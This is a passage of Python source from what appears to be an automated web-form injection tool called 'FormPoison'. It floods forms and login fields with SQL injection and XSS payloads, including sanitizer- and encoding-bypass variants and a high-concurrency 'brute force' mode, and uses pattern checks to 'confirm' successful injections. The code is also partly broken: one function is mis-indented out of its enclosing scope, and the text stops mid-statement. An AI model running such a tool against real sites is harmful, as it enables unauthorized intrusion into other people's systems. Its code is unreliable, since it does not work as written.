                    bypassed = sanitizer_bypass.generate_sanitizer_bypass_payloads(payload['inputField'], 3)
                    for bp in bypassed:
                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_SANITIZER_BYPASS'})

                if bypass_flags.get('encoder_bypass'):
                    bypassed = encoder_bypass.generate_encoding_confusion(payload['inputField'], 2)
                    for bp in bypassed:
                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_ENCODER_BYPASS'})

                if bypass_flags.get('encoding_confusion'):
                    # Special encoding confusion combinations
                    confused = encoder_bypass.generate_encoding_confusion(payload['inputField'], 3)
                    for cf in confused:
                        enhanced_payloads.append({'inputField': cf, 'category': payload['category'] + '_ENCODING_CONFUSION'})

                if bypass_flags.get('size_overflow'):
                    overflowed = size_overflow.generate_overflow_payloads(payload['inputField'], 2)
                    for of in overflowed:
                        enhanced_payloads.append({'inputField': of, 'category': payload['category'] + '_SIZE_OVERFLOW'})

            return enhanced_payloads

        return payloads

    except FileNotFoundError:
        console.print(f"[bold red]Error: Payload file '{file_path}' not found.[/bold red]")
        sys.exit(1)
    except json.JSONDecodeError:
        console.print(f"[bold red]Error: Invalid JSON in payload file '{file_path}'.[/bold red]")
        sys.exit(1)

def filter_payloads(payloads, filter_patterns):
    if not filter_patterns:
        return payloads

    filtered_payloads = []
    for payload in payloads:
        for pattern in filter_patterns:
            if pattern.lower() in payload['inputField'].lower():
                filtered_payloads.append(payload)
                break

    return filtered_payloads

async def get_page_content(url, user_agent, proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False):
    headers = {'User-Agent': sanitize_user_agent(user_agent)}
    try:
        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.get(url, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                return await response.text()
    except Exception as e:
        console.print(f"[bold red]Error fetching page: {e}[/bold red]")
        return None

def get_page_content_with_selenium(url, proxies=None):
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    if proxies:
        proxy_url = proxies.get('http')
        options.add_argument(f'--proxy-server={proxy_url}')
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    time.sleep(3)
    content = driver.page_source
    driver.quit()
    return content

def analyze_response_content(content):
    content = content.lower()
    vulnerabilities = []

    # SQL Injection
    sql_errors = [
        r"sql syntax.*error",
        r"warning: mysql",
        r"unclosed quotation mark",
        r"you have an error in your sql syntax",
        r"ora-\d{5}",
        r"postgresql.*error",
        r"sql server.*error"
    ]
    for error in sql_errors:
        if re.search(error, content):
            vulnerabilities.append(f"SQL Injection (Detected: {error})")

    # XSS
    xss_patterns = [
        r"<script>",
        r"alert\(",
        r"onerror=",
        r"onload=",
        r"javascript:"
    ]
    for pattern in xss_patterns:
        if re.search(pattern, content):
            vulnerabilities.append(f"XSS (Detected: {pattern})")

    # HTML Injection
    if "<html>" in content or "<body>" in content:
        vulnerabilities.append("HTML Injection")

    return vulnerabilities

def analyze_response_headers(headers):
    vulnerabilities = []
    security_headers = {
        "Content-Security-Policy": "Missing Content-Security-Policy header",
        "X-Frame-Options": "Missing X-Frame-Options header",
        "X-XSS-Protection": "Missing X-XSS-Protection header",
        "Strict-Transport-Security": "Missing Strict-Transport-Security header",
        "Referrer-Policy": "Missing Referrer-Policy header",
        "Feature-Policy": "Missing Feature-Policy header",
        "Expect-CT": "Missing Expect-CT header",
        "X-Content-Type-Options": "Missing X-Content-Type-Options header"
    }

    for header, message in security_headers.items():
        if header not in headers:
            vulnerabilities.append(message)

    if "Server" in headers:
        vulnerabilities.append(f"Server Information Leak: {headers['Server']}")
    if "X-Powered-By" in headers:
        vulnerabilities.append(f"Framework Information Leak: {headers['X-Powered-By']}")

    return vulnerabilities

# second checks:

def is_payload_executed(content, payload):
    # restricted IDs to confirm XSS execution
    content_lower = content.lower()
    payload_lower = payload.lower()

    # get SPECIFIC payload content
    unique_parts = re.findall(r'\b[a-z0-9_]{10,}\b', payload_lower)  # 10 chars min

    for part in unique_parts:
        # avoid common inject keywords
        common_words = ['script', 'alert', 'select', 'union', 'where', 'from',
                       'database', 'version', 'information', 'schema', 'table',
                       'column', 'insert', 'update', 'delete', 'create']
        if part not in common_words:
            if part in content_lower:
                return True
    return False

def is_xss_executed(content, payload):
    # more restricted XSS checker
    content_lower = content.lower()

    # 1. reflected ?
    payload_words = payload.lower().split()
    if len(payload_words) > 3:
        unique_words = [w for w in payload_words if len(w) > 6 and w not in ['script', 'alert', 'onload', 'onerror']]
        if unique_words:
            matches = sum(1 for word in unique_words if word in content_lower)
            if matches / len(unique_words) >= 0.7:
                # echo reduction:
                if re.search(r'<[^>]*' + re.escape(unique_words[0]) + r'[^>]*>', content_lower):
                    return True

    # 2. check if java executed
    execution_evidence = [
        r'<script[^>]*>.*?alert\(.*?</script>',  # Tylko z alert wewnątrz
        r'onload\s*=\s*[\'\"][^\'\"]*alert\([^\'\"]*[\'\"]',  # onload z alert
        r'onerror\s*=\s*[\'\"][^\'\"]*alert\([^\'\"]*[\'\"]',  # onerror z alert
    ]

    for evidence in execution_evidence:
        if re.search(evidence, content_lower):
            return True

    # 3. check if executed
    specific_effects = [
        r'xss_test_executed', r'payload_successful', r'injection_confirmed'
    ]

    for effect in specific_effects:
        if effect in content_lower:
            return True

    return False

def is_sql_injection_successful(content, payload):
    # sql checker
    content_lower = content.lower()

    # 1. check specified erors
    specific_sql_errors = [
        r"you have an error in your sql syntax",
        r"unclosed quotation mark",
        r"ora-\d{5}",
        r"postgresql.*error",
        r"division by zero",
        r"unknown column '[^']*'",
        r"table '[^']*' doesn't exist"
    ]

    for error in specific_sql_errors:
        if re.search(error, content_lower):
            return True

    # 2. did we get in ?
    specific_database_data = [
        r'@@version', r'version\(\)', r'user\(\)', r'database\(\)',
        r'information_schema', r'mysql\.', r'pg_catalog'
    ]

    for pattern in specific_database_data:
        if re.search(pattern, content_lower):
            return True

    if not is_payload_executed(content, payload):
        return False

    # 3. fp reduction attemp
    normal_responses = [
        "welcome", "login", "home", "page", "success", "error"
    ]

    normal_count = sum(1 for word in normal_responses if word in content_lower)
    if normal_count > 3:
        return False

    return True

def analyze_response(content, headers, payload_category, payload, verbose_all=False):
    vulnerabilities = []
    content_vulns = analyze_response_content(content)
    vulnerabilities.extend(content_vulns)
    header_vulns = analyze_response_headers(headers)
    vulnerabilities.extend(header_vulns)

    # framework detection
    framework_detected, framework_version = detect_framework(headers, content)
    if framework_detected:
        if framework_version:
            vulnerabilities.append(f"Framework Detected: {framework_detected} (v{framework_version})")
        else:
            vulnerabilities.append(f"Framework Detected: {framework_detected}")

    # libs detection
    libraries_detected = detect_libraries(content)
    if libraries_detected:
        libs_info = []
        for lib_name, lib_version in libraries_detected:
            if lib_version:
                libs_info.append(f"{lib_name} (v{lib_version})")
            else:
                libs_info.append(lib_name)
        vulnerabilities.append(f"Libraries Detected: {', '.join(libs_info)}")

    # high confidence providing
    payload_executed = False
    execution_confidence = "LOW"

    if payload_category == "SQL":
        if is_sql_injection_successful(content, payload):
            payload_executed = True
            execution_confidence = "HIGH"
            # additional checks
            if any(error in content.lower() for error in ["syntax error", "mysql", "postgresql", "ora-"]):
                execution_confidence = "VERY_HIGH"

            console.print(f"[bold red]💀 SQL INJECTION CONFIRMED ({execution_confidence} confidence) 💀[/bold red]")
            console.print(f"[bold green] Payload executed successfully![/bold green]")
            vulnerabilities.append(f"CONFIRMED_SQL_INJECTION ({execution_confidence})")

    elif payload_category == "HTML" or payload_category == "XSS":
        if is_xss_executed(content, payload):
            payload_executed = True
            execution_confidence = "HIGH"
            # additional checks
            if any(evidence in content.lower() for evidence in ["<script>", "onerror=", "onload=", "javascript:"]):
                execution_confidence = "VERY_HIGH"

            console.print(f"[bold red]💀 XSS CONFIRMED ({execution_confidence} confidence) 💀[/bold red]")
            console.print(f"[bold green] XSS payload executed successfully![/bold green]")
            vulnerabilities.append(f"CONFIRMED_XSS ({execution_confidence})")

    if verbose_all:
        console.print(f"[bold yellow]Full response analysis:[/bold yellow]")
        console.print(f"[yellow]Payload executed: {payload_executed} ({execution_confidence} confidence)[/yellow]")

        # show more info
        console.print(f"[yellow]Response headers:[/yellow]")
        for header, value in headers.items():
            console.print(f"[yellow]  {header}: {value}[/yellow]")

        # check if payload is in the response
        if payload in content:
            console.print(f"[bold red]🚨 PAYLOAD FOUND IN RESPONSE![/bold red]")
            console.print(f"[red]Payload: {payload}[/red]")
            console.print(f"[red]Payload category: {payload_category}[/red]")

            # show context
            payload_index = content.find(payload)
            if payload_index != -1:
                start = max(0, payload_index - 50)
                end = min(len(content), payload_index + len(payload) + 50)
                context = content[start:end]
                console.print(f"[red]Payload context: ...{context}...[/red]")

        console.print(f"[yellow]Vulnerabilities detected: {vulnerabilities}[/yellow]")

    return vulnerabilities

async def test_input_field(url, payloads, threat_type, cookies, user_agents, input_field, method="POST", proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False, verbose=False, verbose_all=False, filter=None, secs=0,
                          # BRUTE FORCE PARAMETERS
                          brute_mode=False, max_concurrent=50, timeout=15.0, batch_size=100, batch_delay=1.0, max_retries=2):

    results = []
    positive_responses = 0
    threshold = len(payloads) * 0.5

    table = Table(title=f"Input Field Test Results (Method: {method})" + (" | BRUTE MODE" if brute_mode else ""))
    table.add_column("Payload", style="cyan", no_wrap=False)
    table.add_column("User Agent", style="cyan", no_wrap=False)
    table.add_column("Response Code", justify="right", style="magenta")
    table.add_column("Vulnerability Detected", style="bold green")

    # get all fields
    initial_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
    content = await get_page_content(url, initial_user_agent, proxies, ssl_cert, ssl_key, ssl_verify)
    soup = BeautifulSoup(content, 'html.parser')
    all_input_fields = soup.find_all('input', {'type': ['text', 'password', 'email']})

    # Brute mode optimization
    if brute_mode:
        console.print(f"[bold red]⚠️ BRUTE FORCE MODE ACTIVATED[/bold red]")
        console.print(f"[yellow]Concurrent: {max_concurrent} | Timeout: {timeout}s | Batch size: {batch_size}[/yellow]")

        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)

        connector = aiohttp.TCPConnector(
            limit=max_concurrent * 2,
            limit_per_host=max_concurrent,
            ssl=ssl_context
        )
        timeout_config = aiohttp.ClientTimeout(total=timeout)
    else:
        connector = None
        timeout_config = None

    cookie_jar = aiohttp.CookieJar()
    for key, value in cookies.items():
        cookie_jar.update_cookies({key: value})

    semaphore = asyncio.Semaphore(max_concurrent if brute_mode else 1)

async def test_payload(payload):
    async with semaphore:
        try:
            current_user_agent = random.choice(user_agents) if user_agents else "FormPoison/v.1.0."
            headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
            data = {}

            for field in all_input_fields:
                field_name = field.get('name', 'input_field')
                if field_name == input_field.get('name', 'input_field'):
                    data[field_name] = payload['inputField']
                else:
                    if field.get('type') == 'email':
                        data[field_name] = 'test@example.com'
                    elif field.get('type') == 'password':
                        data[field_name] = 'password123'
                    elif field.get('name', '').lower() in ['username', 'user', 'login']:
                        data[field_name] = 'test_user'
                    else:
                        data[field_name] = 'test_value'

            if brute_mode:
                async with aiohttp.ClientSession(
                    cookie_jar=cookie_jar,
                    connector=connector,
                    timeout=timeout_config
                ) as session:
                    async with session.request(
                        method, url, data=data, headers=headers,
                        proxy=proxies.get('http') if proxies else None, ssl=ssl_verify
                    ) as response:
                        content = await response.text()
                        status_code = response.status
            else:
                ssl_context = ssl.create_default_context()
                if ssl_cert and ssl_key:
                    ssl_context.load_cert_chain(ssl_cert, ssl_key)

                async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
                    if method == "GET":
                        async with session.get(url, params=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                            content = await response.text()
                            status_code = response.status
                    elif method == "POST":
                        async with session.post(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                            content = await response.text()
                            status_code = response.status
                    elif method == "PUT":
                        async with session.put(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                            content = await response.text()
                            status_code = response.status
                    elif method == "DELETE":
                        async with session.delete(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                            content = await response.text()
                            status_code = response.status

            vulnerabilities = analyze_response(content, response.headers, payload['category'], payload['inputField'], verbose_all)
            
            if verbose:
                timestamp = time.strftime("%H:%M:%S")
                short_payload = payload['inputField'][:50] + "..." if len(payload['inputField']) > 50 else payload['inputField']
                injection_detected = any("CONFIRMED" in vuln for vuln in vulnerabilities)
                
                if injection_detected:
                    console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [bold red]{status_code} 💀[/bold red]")
                else:
                    console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [green]{status_code}[/green]")

            result = {
                "payload": payload['inputField'],
                "method": method,
                "user_agent": current_user_agent,
                "response_code": status_code,
                "vulnerabilities": vulnerabilities
            }

            return result

        except Exception as e:
            current_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
            
            if verbose:
                timestamp = time.strftime("%H:%M:%S")
                short_payload = payload['inputField'][:50] + "..." if len(payload['inputField']) > 50 else payload['inputField']
                console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [red]Error[/red]")
            
            return {
                "payload": payload['inputField'],
                "method": method,
                "user_agent": current_user_agent,
                "response_code": "Error",
                "vulnerabilities": [f"Request Failed: {str(e)}"]
            }

async def test_login_input_fields(url, payloads, cookies, user_agents, input_fields, proxies=None, verbose=False, verbose_all=False, secs=0, filter_patterns=None, brute_mode=False, max_concurrent=50, timeout=15.0, batch_size=100, batch_delay=1.0, max_retries=2):
    results = []

    # filtering
    if filter_patterns:
        original_count = len(payloads)
        payloads = filter_payloads(payloads, filter_patterns)
        console.print(f"[bold yellow]Filtered payloads: {len(payloads)}/{original_count} after applying filter[/bold yellow]")

    if not payloads:
        console.print("[bold red]No payloads left after filtering![/bold red]")
        return results

    table = Table(title=f"Login Input Field Test Results" + (" | BRUTE MODE" if brute_mode else ""))
    table.add_column("Login Payload", style="cyan", no_wrap=False)
    table.add_column("Password Payload", style="cyan", no_wrap=False)
    table.add_column("Payload Category", style="cyan", no_wrap=False)
    table.add_column("User Agent", style="cyan", no_wrap=False)
    table.add_column("Response Code", justify="right", style="magenta")
    table.add_column("Vulnerability Detected", style="bold green")

    if brute_mode:
        console.print(f"[bold red]BRUTE FORCE MODE PARAMETERS:[/bold red]")
        console.print(f"[yellow]Concurrent: {max_concurrent} | Timeout: {timeout}s | Batch size: {batch_size}[/yellow]")

        connector = aiohttp.TCPConnector(
            limit=max_concurrent * 2,
            limit_per_host=max_concurrent
        )
        timeout_config = aiohttp.ClientTimeout(total=timeout)
    else:
        connector = None
        timeout_config = None

    cookie_jar = aiohttp.CookieJar()
    for key, value in cookies.items():
        cookie_jar.update_cookies({key: value})

    login_field = None
    password_field = None

    # force to use agents
    initial_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
    content = await get_page_content(url, initial_user_agent, proxies)
    soup = BeautifulSoup(content, 'html.parser')

    # skip checkbox, radio, hidden etc.
    input_fields = soup.find_all('input', {
        'type': ['text', 'password', 'email', 'search', 'tel', 'url', 'query']  # only text fields
    })

    filtered_input_fields = []
    for field in input_fields:
        field_type = field.get('type', '').lower()
        # BLACKLISTED TYPOS
        if field_type in ['checkbox', 'radio', 'hidden', 'submit', 'button', 'reset', 'file', 'image']:
            if verbose:
                console.print(f"[bold yellow]Skipping non-text field: {field.get('name', '')} (type: {field_type})[/bold yellow]")
            continue
        filtered_input_fields.append(field)

    input_fields = filtered_input_fields

    console.print(f"[bold yellow]Found TEXT input fields:[/bold yellow]")
    for field in input_fields:
        name = field.get('name', '')
        id_ = field.get('id', '')
        field_type = field.get('type', '')
        placeholder = field.get('placeholder', '')
        console.print(f"[bold blue]Field: name={name}, id={id_}, type={field_type}, placeholder={placeholder}[/bold blue]")

    for field in input_fields:
        name = field.get('name', '').lower()
        id_ = field.get('id', '').lower()
        placeholder = field.get('placeholder', '').lower()
        field_type = field.get('type', '').lower()

        # check if is it a login
        login_keywords = ['login', 'username', 'user', 'email', 'e-mail', 'mail', 'userid', 'user_id', 'loginname', 'account', 'mat-input-1']
        if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in login_keywords):
            login_field = field
            console.print(f"[bold green]Found login field: name={name}, id={id_}, type={field_type}[/bold green]")

        # check if is it a password
        password_keywords = ['password', 'pass', 'passwd', 'pwd', 'userpassword', 'user_pass']
        if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in password_keywords):
            # verify if considered as pass
            if field_type == 'password':
                password_field = field
                console.print(f"[bold green]Found password field: name={name}, type={field_type}[/bold green]")

    if not login_field or not password_field:
        console.print("[bold yellow]No suitable login or password fields found for testing.[/bold yellow]")
        return results

    login_payloads = ["admin", "test", "user", "' OR 1='1"]

    # filter flag integration
    all_payloads = [(payload['inputField'], payload['category']) for payload in payloads]

    if not all_payloads:
        console.print("[bold yellow]No payloads found after filtering![/bold yellow]")
        return results

    semaphore = asyncio.Semaphore(max_concurrent if brute_mode else 1)

    async def test_login_combination(login_payload, password_payload, payload_category):
        async with semaphore:
            try:
                if verbose:
                    timestamp = time.strftime("%H:%M:%S")
                    console.print(f"[{timestamp}] [INFO] Testing login '{login_payload}' with password payload '{password_payload}' -> ", end="")
                current_user_agent = random.choice(user_agents) if user_agents else "FormPoison/v.1.0.1."
                headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
                data = {
                    login_field.get('name', 'login'): login_payload,
                    password_field.get('name', 'password'): password_payload
                }

                if brute_mode:
                    async with aiohttp.ClientSession(
                        cookie_jar=cookie_jar,
                        connector=connector,
                        timeout=timeout_config
                    ) as session:
                        async with session.post(
                            url, data=data, headers=headers,
                            proxy=proxies.get('http') if proxies else None
                        ) as response:
                            content = await response.text()
                            status_code = response.status
                else:
                    async with aiohttp.ClientSession(cookie_jar=cookie_jar) as session:
                        async with session.post(
                            url, data=data, headers=headers,
                            proxy=proxies.get('http') if proxies else None
                        ) as response:
                            content = await response.text()
                            status_code = response.status

                vulnerabilities = analyze_response(content, response.headers, payload_category, password_payload, verbose_all)

                if verbose:
                    injection_detected = any("CONFIRMED" in vuln for vuln in vulnerabilities)
                    if injection_detected:
                        console.print(f"[bold red]{status_code}[/bold red]")
                    else:
                        console.print(f"[green]{status_code}[/green]")
                result = {
                    "login_payload": login_payload,
                    "password_payload": password_payload,
                    "payload_category": payload_category,
                    "user_agent": current_user_agent,
                    "response_code": status_code,
                    "vulnerabilities": vulnerabilities
                }

                return result

            except Exception as e:
                current_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
                if verbose:
                    timestamp = time.strftime("%H:%M:%S")
                    console.print(f"[{timestamp}] [INFO] Testing login combination -> [red]Error[/red]")
                return {
                    "login_payload": login_payload,
                    "password_payload": password_payload,
                    "payload_category": payload_category,
                    "user_agent": current_user_agent,
                    "response_code": "Error",
                    "vulnerabilities": [f"Request Failed: {str(e)}"]
                }

    test_combinations = []
    for login_payload in login_payloads:
        for password_payload, payload_category in all_payloads:
            test_combinations.append((login_payload, password_payload, payload_category))

    total_tests = len(test_combinations)

    if brute_mode:
        all_tasks = [test_login_combination(login, pwd, category) for login, pwd, category in test_combinations]
        total_batches = (len(all_tasks) + batch_size - 1) // batch_size
        completed = 0
        total = len(all_tasks)

        for batch_num in range(total_batches):
            start_idx = batch_num * batch_size
            end_idx = min(start_idx + batch_size, len(all_tasks))
            batch_tasks = all_tasks[start_idx:end_idx]

            console.print(f"[dim]Batch {batch_num + 1}/{total_batches} ({len(batch_tasks)} requests)[/dim]")
            
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            
            for result in batch_results:
                if isinstance(result, dict):
                    results.append(result)
                    completed += 1
            
            console.print(f"[dim]Progress: {completed}/{total} ({completed/total*100:.1f}%)[/dim]")

            if batch_num < total_batches - 1 and batch_delay > 0:
                await asyncio.sleep(batch_delay)

    else:
        # NORMAL MODE
        console.print(f"[bold cyan]Starting sequential login testing with {len(test_combinations)} combinations[/bold cyan]")
        
        completed = 0
        total = len(test_combinations)
        
        for login_payload, password_payload, payload_category in test_combinations:
            result = await test_login_combination(login_payload, password_payload, payload_category)
            results.append(result)
            completed += 1

            if verbose or verbose_all:
                console.print(f"[bold blue]Testing login: {result['login_payload']}, password: {result['password_payload']} ({result['payload_category']})[/bold blue]")
                console.print(f"[bold blue]Response code: {result['response_code']}[/bold blue]")
                console.print(f"[bold blue]Vulnerabilities: {', '.join(result['vulnerabilities'])}[/bold blue]")

            if secs > 0:
                await asyncio.sleep(secs)
    console.print(table)

    # Save results with metadata
    results_metadata = {
        "parameters": {
            "brute_mode": brute_mode,
            "max_concurrent": max_concurrent,
            "timeout": timeout,
            "batch_size": batch_size,
            "batch_delay": batch_delay,
            "max_retries": max_retries
        },
        "results": results
    }

    with open("login_test_results.json", "w") as f:
        json.dump(results_metadata, f, indent=4)

    console.print(f"[bold green]Login test results saved to 'login_test_results.json'[/bold green]")
    return results
def get_string_input_fields(content):
    soup = BeautifulSoup(content, 'html.parser')
    # only text pls
    input_fields = soup.find_all('input', {
        'type': ['text', 'password', 'email', 'search', 'tel', 'url']
    })

    # additional rules
    filtered_inputs = []
    for field in input_fields:
        field_type = field.get('type', '').lower()
        if field_type not in ['checkbox', 'radio', 'hidden', 'submit', 'button', 'reset', 'file', 'image']:
            filtered_inputs.append(field)

    textareas = soup.find_all('textarea')
    return filtered_inputs + textareas

def get_forms_and_inputs(content,verbose):
    soup = BeautifulSoup(content, 'html.parser')
    forms = soup.find_all('form')
    forms_with_inputs = []
    for form in forms:
        # get all & filter
        all_inputs = form.find_all('input')
        textareas = form.find_all('textarea')

        # get txt
        filtered_inputs = []
        for input_field in all_inputs:
            field_type = input_field.get('type', '').lower()
            if field_type in ['text', 'password', 'email', 'search', 'tel', 'url']:
                filtered_inputs.append(input_field)
            elif field_type in ['checkbox', 'radio', 'hidden', 'submit', 'button', 'reset']:
                if verbose:
                    console.print(f"[bold yellow]Skipping non-text field in form: {input_field.get('name', '')} (type: {field_type})[/bold yellow]")

        forms_with_inputs.append((form, filtered_inputs + textareas))
    return forms_with_inputs

def find_field_by_name(input_fields, field_name):
    if not field_name:
        return None

    field_name = field_name.lower()

    for field in input_fields:
        # skip non-text typo
        field_type = field.get('type', '').lower()
        if field_type in ['checkbox', 'radio', 'hidden', 'submit', 'button', 'reset', 'file', 'image']:
            continue

        field_attrs = [
            field.get('name', '').lower(),
            field.get('id', '').lower(),
            ' '.join(field.get('class', [])).lower(),
            field.get('placeholder', '').lower(),
            field.get('type', '').lower(),
            field.get('value', '').lower(),
            field.get('aria-label', '').lower()
        ]

        if any(field_name in attr for attr in field_attrs):
            return field

    return None

async def test_all_forms(url, payloads, threat_type, cookies, user_agents, method="POST", proxies=None, ssl_cert=None, ssl_key=None, filter=None, ssl_verify=False, verbose=False, verbose_all=False, secs=0, brute_mode=False, max_concurrent=50, timeout=15.0, batch_size=100, batch_delay=1.0, max_retries=2):
    results = [] 
    initial_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
    content = await get_page_content(url, initial_user_agent, proxies, ssl_cert, ssl_key, ssl_verify)

    if not content:
        console.print("[bold red]Failed to fetch page content[/bold red]")
        return results

    soup = BeautifulSoup(content, 'html.parser')
    forms = soup.find_all('form')

    console.print(f"[bold green]Found {len(forms)} forms to test[/bold green]")

    # Brute mode optimization
    if brute_mode:
        console.print(f"[bold red]🚀 BRUTE FORCE MODE ACTIVATED[/bold red]")
        console.print(f"[yellow]Concurrent: {max_concurrent} | Timeout: {timeout}s | Batch size: {batch_size}[/yellow]")

        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)

        connector = aiohttp.TCPConnector(
            limit=max_concurrent * 2,
            limit_per_host=max_concurrent,
            ssl=ssl_context
        )
        timeout_config = aiohttp.ClientTimeout(total=timeout)
    else:
        connector = None
        timeout_config = None

    cookie_jar = aiohttp.CookieJar()
    for key, value in cookies.items():
        cookie_jar.update_cookies({key: value})

    semaphore = asyncio.Semaphore(max_concurrent if brute_mode else 1)

    async def test_form_with_payload(form, payload):
        async with semaphore:
            try:
                current_user_agent = random.choice(user_agents) if user_agents else "FormPoison/v.1.0.1"
                headers = {'User-Agent': sanitize_user_agent(current_user_agent)}

                data = {}
                inputs = form.find_all('input')
                textareas = form.find_all('textarea')
                selects = form.find_all('select')

                all_fields = inputs + textareas + selects

                for field in all_fields:
                    field_name = field.get('name', 'input_field')
                    field_type = field.get('type', 'text').lower()

                    if field_type in ['text', 'email', 'search', 'url', 'tel'] or field.name in ['textarea', 'select']:
                        data[field_name] = payload['inputField']
                    elif field_type == 'password':
                        data[field_name] = 'password123'
                    elif field_type == 'hidden' and field.get('value'):
                        data[field_name] = field.get('value')
                    else:
                        data[field_name] = 'test_value'

                if brute_mode:
                    async with aiohttp.ClientSession(
                        cookie_jar=cookie_jar,
                        connector=connector,
                        timeout=timeout_config
                    ) as session:
                        async with session.request(
                            method, url, data=data, headers=headers,
                            proxy=proxies.get('http') if proxies else None,
                            ssl=ssl_verify
                        ) as response:
                            content = await response.text()
                            status_code = response.status
                else:
                    ssl_context = ssl.create_default_context()
                    if ssl_cert and ssl_key:
                        ssl_context.load_cert_chain(ssl_cert, ssl_key)

                    async with aiohttp.ClientSession(
                        cookie_jar=cookie_jar,
                        connector=aiohttp.TCPConnector(ssl=ssl_context)
                    ) as session:
                        async with session.request(
                            method, url, data=data, headers=headers,
                            proxy=proxies.get('http') if proxies else None,
                            ssl=ssl_verify
                        ) as response:
                            content = await response.text()
                            status_code = response.status

                vulnerabilities = analyze_response(content, response.headers, payload['category'], payload['inputField'], verbose_all)

                timestamp = time.strftime("%H:%M:%S")
                short_payload = payload['inputField'][:80] + "..." if len(payload['inputField']) > 80 else payload['inputField']
                injection_detected = any("CONFIRMED" in vuln for vuln in vulnerabilities)
                
                if injection_detected:
                    console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [bold red]{status_code} VULNERABLE[/bold red]")
                    for vuln in vulnerabilities:
                        if "CONFIRMED" in vuln:
                            console.print(f"[{timestamp}] [CRITICAL] {vuln}")
                else:
                    console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [green]{status_code}[/green]")

                result = {
                    "form_action": form.get('action', ''),
                    "form_method": form.get('method', 'GET'),
                    "payload": payload['inputField'],
                    "user_agent": current_user_agent,
                    "response_code": status_code,
                    "vulnerabilities": vulnerabilities
                }

                return result

            except Exception as e:
                current_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
                timestamp = time.strftime("%H:%M:%S")
                short_payload = payload['inputField'][:80] + "..." if len(payload['inputField']) > 80 else payload['inputField']
                console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [red]Error: {str(e)}[/red]")
                
                return {
                    "form_action": form.get('action', ''),
                    "form_method": form.get('method', 'GET'),
                    "payload": payload['inputField'],
                    "user_agent": current_user_agent,
                    "response_code": "Error",
                    "vulnerabilities": [f"Request Failed: {str(e)}"]
                }

    # BRUTE MODE
    if brute_mode:
        console.print(f"[bold cyan]🚀 Starting brute force with {len(forms)} forms × {len(payloads)} payloads = {len(forms) * len(payloads)} total requests[/bold cyan]")
        
        all_tasks = []
        for form_idx, form in enumerate(forms):
            for payload_idx, payload in enumerate(payloads):
                all_tasks.append(test_form_with_payload(form, payload))

        total_batches = (len(all_tasks) + batch_size - 1) // batch_size
        completed = 0
        total = len(all_tasks)

        for batch_num in range(total_batches):
            start_idx = batch_num * batch_size
            end_idx = min(start_idx + batch_size, len(all_tasks))
            batch_tasks = all_tasks[start_idx:end_idx]

            console.print(f"[dim]Batch {batch_num + 1}/{total_batches} ({len(batch_tasks)} requests)[/dim]")
            
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            
            for result in batch_results:
                if isinstance(result, dict):  # Skip exceptions
                    results.append(result)
                    completed += 1
            
            console.print(f"[dim]Progress: {completed}/{total} ({completed/total*100:.1f}%)[/dim]")

            if batch_num < total_batches - 1 and batch_delay > 0:
                await asyncio.sleep(batch_delay)

        if connector:
            await connector.close()

    else:
        # sequential
        console.print(f"[bold cyan]Starting sequential testing with {len(forms)} forms × {len(payloads)} payloads[/bold cyan]")
        
        total = len(forms) * len(payloads)
        completed = 0
        
        for form_idx, form in enumerate(forms):
            form_action = form.get('action', 'default')
            console.print(f"[blue]Testing form {form_idx + 1}/{len(forms)}: {form_action}[/blue]")
            
            for payload_idx, payload in enumerate(payloads):
                result = await test_form_with_payload(form, payload)
                results.append(result)
                completed += 1
                
                if secs > 0:
                    await asyncio.sleep(secs)

    vulnerabilities_found = sum(1 for r in results if r.get('vulnerabilities') and any("CONFIRMED" in v for v in r['vulnerabilities']))
    console.print(f"\n[bold green]✓ Testing completed: {len(results)} requests sent[/bold green]")
    console.print(f"[bold red]🎯 Vulnerabilities found: {vulnerabilities_found}[/bold red]")
    
    return results

def analyze_mutation_xss_response(content, payload):
    vulnerabilities = []

    if 'alert(1)' in content:
        if '<script>' in content and 'alert(1)' in content:
            vulnerabilities.append("SCRIPT_EXEC")
        if 'onerror' in content and 'alert(1)' in content:
            vulnerabilities.append("ONERROR_EXEC")
        if 'onload' in content and 'alert(1)' in content:
            vulnerabilities.append("ONLOAD_EXEC")
        if 'javascript:' in content.lower() and 'alert(1)' in content:
